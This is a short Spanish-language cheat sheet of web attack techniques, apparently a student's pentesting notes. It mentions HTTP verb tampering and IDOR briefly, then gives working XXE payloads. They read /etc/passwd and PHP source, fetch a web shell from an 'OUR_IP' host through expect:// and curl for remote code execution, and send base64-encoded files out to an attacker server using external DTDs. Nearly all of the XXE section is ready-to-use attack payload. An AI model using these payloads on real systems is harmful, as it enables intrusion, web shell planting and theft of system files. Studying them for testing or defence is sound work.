# [HTTP Verb Tampering](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods)
- Cambiar los metodos en las peticiones sirve para Bypassear el debil authentication

# IDOR
- Tener en cuenta que no simple es el numero en texto plano puede estar cifrado


# XXE
## Level 1
```
# LFI                    
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>


<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>


# RCE (A mi dipositivo, esto ejecuta el php)
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>

```

## Level 2
```
# 1
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
<email>
  <contenido>&joined;</contenido>
</email>

# 2
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email> 

En mi servidor
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd

# 3
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>


Archivo xxe.dtd
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

## Blind Data Exfiltration

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>

Archivo xxe.dtd

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
